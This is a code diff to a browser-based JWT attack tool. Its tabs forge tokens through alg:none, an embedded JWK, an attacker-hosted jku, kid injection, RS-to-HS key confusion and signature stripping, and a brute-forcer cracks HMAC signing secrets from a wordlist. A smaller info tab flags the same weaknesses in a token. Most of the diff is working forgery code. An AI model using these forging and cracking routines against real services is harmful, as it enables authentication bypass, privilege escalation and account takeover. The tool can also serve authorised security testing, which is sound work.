+    if (opts.force || state.lastDecodedToken !== trimmed) {
+      $("payload-edit").value = JSON.stringify(decoded.payload, null, 2);
+    }
+    state.lastDecodedToken = trimmed;
+    statusEl.textContent = "decoded";
+    runActive();
+  }
 
-    const liveDecode = debounce(() => applyDecoded($("input-token").value), 120);
-    $("input-token").addEventListener("input", liveDecode);
-    $("input-token").addEventListener("paste", () => {
-      setTimeout(() => applyDecoded($("input-token").value, { force: true }), 0);
+  function clearError() { $("attack-err").textContent = ""; }
+  function showError(e) { $("attack-err").textContent = e.message || String(e); }
+
+  async function runActive() {
+    clearError();
+    const tab = state.tab;
+    if (!state.lastHeader) { setOutput(null, null, null); return; }
+    try {
+      if (tab === "none") return runNone();
+      if (tab === "sign") return runSign();
+      if (tab === "jwk") return; // manual via button
+      if (tab === "jku") return; // manual via button
+      if (tab === "kid") return runKid();
+      if (tab === "rs2hs") return runRs2Hs();
+      if (tab === "strip") return runStrip();
+      if (tab === "verify") return runVerify();
+      if (tab === "brute") return; // manual via button
+      if (tab === "diff") return runDiff();
+      if (tab === "info") return runInfo();
+    } catch (e) { showError(e); }
+  }
+
+  /* ---- tab: alg:none ---- */
+  function runNone() {
+    const payload = currentPayload();
+    const keep = $("none-keep").checked;
+    const trailing = $("none-trailing").checked;
+    const algLit = $("none-alg-literal").value;
+    let header;
+    if (keep && state.lastHeader) {
+      header = { alg: algLit };
+      for (const [k, v] of Object.entries(state.lastHeader)) if (k !== "alg") header[k] = v;
+      if (header.typ === undefined) header.typ = "JWT";
+    } else {
+      header = { alg: algLit, typ: "JWT" };
+    }
+    const h = jsonSeg(header), p = jsonSeg(payload);
+    const token = trailing ? `${h}.${p}.` : `${h}.${p}`;
+    setOutput(token, header, payload);
+  }
+
+  /* ---- tab: sign as ---- */
+  async function runSign() {
+    const payload = currentPayload();
+    const alg = $("sign-alg").value;
+    const keyRaw = $("sign-key").value.trim();
+    const kid = $("sign-kid").value.trim();
+    const header = { typ: "JWT" };
+    if (kid) header.kid = kid;
+    if (!keyRaw) {
+      setOutput(null, header, payload);
+      return;
+    }
+    const km = (alg.startsWith("HS") ? keyRaw : keyRaw);
+    const token = await signJwt(header, payload, alg, km);
+    header.alg = alg;
+    setOutput(token, header, payload);
+  }
+
+  /* ---- tab: jwk embed ---- */
+  async function jwkGenerate() {
+    clearError();
+    const alg = $("jwk-alg").value;
+    $("jwk-status").textContent = "generating…";
+    try {
+      const kp = await generateKeypair(alg);
+      state.generated.jwk = kp;
+      $("jwk-pem").textContent = kp.pem;
+      $("jwk-status").textContent = "ready";
+      await runJwk();
+    } catch (e) { showError(e); $("jwk-status").textContent = "failed"; }
+  }
+  async function runJwk() {
+    const kp = state.generated.jwk;
+    if (!kp) return;
+    const payload = currentPayload();
+    const header = { typ: "JWT", jwk: kp.jwk, kid: kp.jwk.kid };
+    const token = await signJwt(header, payload, kp.alg, kp.privateKey);
+    header.alg = kp.alg;
+    setOutput(token, header, payload, { private_pem: kp.pem });
+  }
+
+  /* ---- tab: jku ---- */
+  async function jkuGenerate() {
+    clearError();
+    const alg = $("jku-alg").value;
+    const url = $("jku-url").value.trim();
+    if (!url) { showError(new Error("jku URL is required")); return; }
+    $("jku-status").textContent = "generating…";
+    try {
+      const kp = await generateKeypair(alg);
+      state.generated.jku = kp;
+      const jwks = { keys: [kp.jwk] };
+      $("jku-jwks").textContent = JSON.stringify(jwks, null, 2);
+      $("jku-status").textContent = "ready";
+      await runJku();
+    } catch (e) { showError(e); $("jku-status").textContent = "failed"; }
+  }
+  async function runJku() {
+    const kp = state.generated.jku;
+    if (!kp) return;
+    const payload = currentPayload();
+    const url = $("jku-url").value.trim();
+    const header = { typ: "JWT", jku: url, kid: kp.jwk.kid };
+    const token = await signJwt(header, payload, kp.alg, kp.privateKey);
+    header.alg = kp.alg;
+    setOutput(token, header, payload, { private_pem: kp.pem });
+  }
+
+  /* ---- tab: kid ---- */
+  async function runKid() {
+    const payload = currentPayload();
+    const kid = $("kid-value").value;
+    const secret = $("kid-secret").value;
+    const alg = $("kid-alg").value;
+    if (kid === "") { setOutput(null, null, null); return; }
+    const header = { typ: "JWT", kid };
+    const token = await signJwt(header, payload, alg, secret);
+    header.alg = alg;
+    setOutput(token, header, payload, { secret_was_empty: secret === "" });
+  }
+
+  /* ---- tab: rs->hs ---- */
+  async function runRs2Hs() {
+    const payload = currentPayload();
+    const pem = $("rs2hs-pem").value;
+    const alg = $("rs2hs-alg").value;
+    if (!pem.trim()) { setOutput(null, null, null); $("rs2hs-alt").textContent = "—"; return; }
+    const raw = pem;
+    const normalized = pem.split("\n").map(l => l.trim()).filter(Boolean).join("\n") + "\n";
+    const header = { typ: "JWT" };
+    const tokRaw = await signJwt(header, payload, alg, raw);
+    const tokNorm = await signJwt({ ...header }, payload, alg, normalized);
+    header.alg = alg;
+    setOutput(tokRaw, header, payload, { token_normalized: tokNorm });
+    $("rs2hs-alt").textContent = tokNorm;
+  }
+
+  /* ---- tab: strip ---- */
+  function runStrip() {
+    const payload = currentPayload();
+    const header = { ...state.lastHeader };
+    const algOverride = $("strip-alg").value.trim();
+    if (algOverride) header.alg = algOverride;
+    const trailing = $("strip-trailing").checked;
+    const h = jsonSeg(header), p = jsonSeg(payload);
+    const token = trailing ? `${h}.${p}.` : `${h}.${p}`;
+    setOutput(token, header, payload);
+  }
+
+  /* ---- tab: verify ---- */
+  async function runVerify() {
+    const badge = $("verify-badge");
+    const token = $("input-token").value.trim();
+    if (!token) { badge.className = "badge warn"; badge.textContent = "awaiting input"; return; }
+    const alg = $("verify-alg").value;
+    const key = $("verify-key").value.trim();
+    if (alg !== "none" && !key) { badge.className = "badge warn"; badge.textContent = "awaiting key"; return; }
+    try {
+      const ok = await verifyJwt(token, alg, key);
+      badge.className = "badge " + (ok ? "ok" : "bad");
+      badge.textContent = ok ? "valid" : "invalid";
+    } catch (e) {
+      badge.className = "badge bad";
+      badge.textContent = "error: " + (e.message || e);
+    }
+  }
+
+  /* ---- tab: brute ---- */
+  let bundledWordlist = null;
+  async function loadBundledWordlist() {
+    if (bundledWordlist) return bundledWordlist;
+    const r = await fetch("/wordlist");
+    if (!r.ok) throw new Error("could not load bundled wordlist");
+    const text = await r.text();
+    bundledWordlist = text.split("\n").map(l => l.trim()).filter(l => l && !l.startsWith("#"));
+    return bundledWordlist;
+  }
+  async function runBrute() {
+    clearError();
+    $("brute-status").textContent = "running…";
+    const token = $("input-token").value.trim();
+    if (!token) { $("brute-status").textContent = "no token"; return; }
+    let parts;
+    try { parts = decodeJwt(token); } catch (e) { showError(e); $("brute-status").textContent = ""; return; }
+    const alg = parts.header.alg;
+    if (!alg || !alg.startsWith("HS")) {
+      $("brute-status").textContent = `unsupported alg ${alg}`; return;
+    }
+    let list;
+    const raw = $("brute-wordlist").value.trim();
+    if (raw) list = raw.split("\n").map(s => s.trim()).filter(s => s && !s.startsWith("#"));
+    else {
+      try { list = await loadBundledWordlist(); }
+      catch (e) { showError(e); $("brute-status").textContent = ""; return; }
+    }
+    const [h, p, s] = token.split(".");
+    const target = bytesFromB64url(s);
+    const data = te.encode(`${h}.${p}`);
+    const bits = alg.slice(2);
+    let i = 0;
+    for (const secret of list) {
+      const k = await crypto.subtle.importKey("raw", te.encode(secret),
+        { name: "HMAC", hash: HASH_OF[bits] }, false, ["sign"]);
+      const sig = new Uint8Array(await crypto.subtle.sign({ name: "HMAC" }, k, data));
+      if (sig.length === target.length) {
+        let ok = true;
+        for (let j = 0; j < sig.length; j++) if (sig[j] !== target[j]) { ok = false; break; }
+        if (ok) {
+          $("brute-status").textContent = `found after ${i + 1} tries`;
+          setOutput(token, parts.header, parts.payload, { secret });
+          return;
+        }
+      }
+      i++;
+      if (i % 200 === 0) {
+        $("brute-status").textContent = `tried ${i}…`;
+        await new Promise(r => setTimeout(r, 0));
+      }
+    }
+    $("brute-status").textContent = `no match after ${i} tries`;
+  }
+
+  /* ---- tab: diff ---- */
+  function diffDict(a, b) {
+    const added = {}, removed = {}, changed = {};
+    for (const k of Object.keys(b)) {
+      if (!(k in a)) added[k] = b[k];
+      else if (JSON.stringify(a[k]) !== JSON.stringify(b[k])) changed[k] = { from: a[k], to: b[k] };
+    }
+    for (const k of Object.keys(a)) if (!(k in b)) removed[k] = a[k];
+    return { added, removed, changed };
+  }
+  function runDiff() {
+    const other = $("diff-other").value.trim();
+    if (!state.lastHeader || !other) { $("diff-out").textContent = "—"; return; }
+    let d;
+    try { d = decodeJwt(other); } catch (e) { $("diff-out").textContent = `error: ${e.message}`; return; }
+    const out = {
+      header: diffDict(state.lastHeader, d.header),
+      payload: diffDict(state.lastPayload, d.payload),
+    };
+    $("diff-out").textContent = JSON.stringify(out, null, 2);
+  }
+
+  /* ---- tab: info ---- */
+  function runInfo() {
+    if (!state.lastHeader || !state.lastPayload) { $("info-out").textContent = "—"; return; }
+    const h = state.lastHeader, p = state.lastPayload;
+    const now = Math.floor(Date.now() / 1000);
+    const warnings = [];
+    const alg = h.alg;
+    if (typeof alg === "string" && alg.toLowerCase() === "none") warnings.push(`alg is ${JSON.stringify(alg)} — unsigned`);
+    if (!alg) warnings.push("header missing alg");
+    if (p.exp == null) warnings.push("missing exp — token never expires");
+    else if (typeof p.exp === "number" && p.exp > now + 5 * 365 * 86400) warnings.push("exp more than 5 years out");
+    if ("jwk" in h) warnings.push("header embeds jwk");
+    if ("jku" in h) warnings.push("header carries jku");
+    if (typeof h.kid === "string") {
+      if (/[\/\\]|\.\.|\0/.test(h.kid)) warnings.push("kid looks path-like");
+      if (/['";]|--/.test(h.kid)) warnings.push("kid contains SQL-ish characters");
+    }
+    for (const k of ["role","roles","isAdmin","admin","groups","scope","scopes"]) {
+      if (k in p) { warnings.push(`role-like claim present: ${k}=${JSON.stringify(p[k])}`); break; }
+    }
+    const out = {
+      alg: h.alg, typ: h.typ, kid: h.kid ?? null, jku: h.jku ?? null,
+      jwk_embedded: "jwk" in h,
+      claims: Object.fromEntries(["iss","sub","aud","exp","nbf","iat","jti"].filter(k => k in p).map(k => [k, p[k]])),
+      expired: typeof p.exp === "number" && p.exp < now,
+      warnings,
+    };
+    $("info-out").textContent = JSON.stringify(out, null, 2);
+  }
+
+  /* ---- tab switching ---- */
+  function selectTab(name) {
+    state.tab = name;
+    document.querySelectorAll(".tab").forEach(b => b.classList.toggle("active", b.dataset.tab === name));
+    document.querySelectorAll(".pane").forEach(p => p.classList.toggle("active", p.dataset.pane === name));
+    runActive();
+  }
+
+  /* ---- removes list ---- */
+  function renderRemoves() {
+    const el = $("removes-list");
+    el.innerHTML = "";
+    state.removes.forEach((k, i) => {
+      const c = document.createElement("span");
+      c.className = "chip"; c.textContent = k;
+      const b = document.createElement("button");
+      b.textContent = "x"; b.title = "remove";
+      b.onclick = () => { state.removes.splice(i, 1); renderRemoves(); runActive(); };
+      c.appendChild(b);
+      el.appendChild(c);
     });
+  }
 
-    $("btn-reset-payload").onclick = () => {
-      applyDecoded($("input-token").value, { force: true });
-    };
+  /* ---- wiring ---- */
+  const liveDecode = debounce(() => applyDecoded($("input-token").value), 120);
+  $("input-token").addEventListener("input", liveDecode);
+  $("input-token").addEventListener("paste", () => {
+    setTimeout(() => applyDecoded($("input-token").value, { force: true }), 0);
+  });
 
-    $("btn-add-remove").onclick = () => {
-      const v = $("remove-input").value.trim();
-      if (!v) return;
-      if (!state.removes.includes(v)) state.removes.push(v);
-      $("remove-input").value = "";
-      renderRemoves();
-      runForge();
-    };
-    $("remove-input").addEventListener("keydown", (e) => {
-      if (e.key === "Enter") { e.preventDefault(); $("btn-add-remove").click(); }
-    });
+  $("btn-reset-payload").onclick = () => applyDecoded($("input-token").value, { force: true });
 
-    const liveForge = debounce(runForge, 80);
-    $("payload-edit").addEventListener("input", liveForge);
-    $("opt-keep-header").addEventListener("change", runForge);
-    $("opt-trailing-dot").addEventListener("change", runForge);
+  $("btn-add-remove").onclick = () => {
+    const v = $("remove-input").value.trim();
+    if (!v) return;
+    if (!state.removes.includes(v)) state.removes.push(v);
+    $("remove-input").value = ""; renderRemoves(); runActive();
+  };
+  $("remove-input").addEventListener("keydown", (e) => {
+    if (e.key === "Enter") { e.preventDefault(); $("btn-add-remove").click(); }
+  });
 
-    $("btn-copy").onclick = async () => {
-      const t = $("output-token").textContent;
-      if (!t || t === "—") return;
-      try {
-        await navigator.clipboard.writeText(t);
-        $("copy-status").textContent = "copied";
-        setTimeout(() => ($("copy-status").textContent = ""), 1500);
-      } catch {
-        $("copy-status").textContent = "copy failed";
-      }
-    };
+  $("payload-edit").addEventListener("input", debounce(runActive, 80));
+  document.querySelectorAll(".tab").forEach(b => b.addEventListener("click", () => selectTab(b.dataset.tab)));
+
+  /* per-tab inputs that should trigger live forging */
+  for (const id of [
+    "none-keep","none-trailing","none-alg-literal",
+    "sign-alg","sign-key","sign-kid",
+    "kid-value","kid-secret","kid-alg",
+    "rs2hs-pem","rs2hs-alg",
+    "strip-alg","strip-trailing",
+    "verify-alg","verify-key",
+    "diff-other",
+  ]) {
+    const el = $(id);
+    if (el) el.addEventListener("input", debounce(runActive, 100));
+    if (el && el.tagName === "SELECT") el.addEventListener("change", runActive);
+    if (el && el.type === "checkbox") el.addEventListener("change", runActive);
+  }
+  $("kid-preset").addEventListener("change", (e) => {
+    if (e.target.value) { $("kid-value").value = e.target.value; runActive(); }
+  });
+
+  $("jwk-gen").onclick = jwkGenerate;
+  $("jku-gen").onclick = jkuGenerate;
+  $("brute-go").onclick = runBrute;
+
+  $("btn-copy").onclick = async () => {
+    const t = $("output-token").textContent;
+    if (!t || t === "—") return;
+    try {
+      await navigator.clipboard.writeText(t);
+      $("copy-status").textContent = "copied";
+      setTimeout(() => ($("copy-status").textContent = ""), 1500);
+    } catch { $("copy-status").textContent = "copy failed"; }
+  };
+
+  /* re-forge on payload changes (jwk/jku already-generated keys) */
+  document.addEventListener("input", debounce(() => {
+    if (state.tab === "jwk" && state.generated.jwk) runJwk().catch(showError);
+    if (state.tab === "jku" && state.generated.jku) runJku().catch(showError);
+  }, 120));
   </script>
 </body>
 </html>
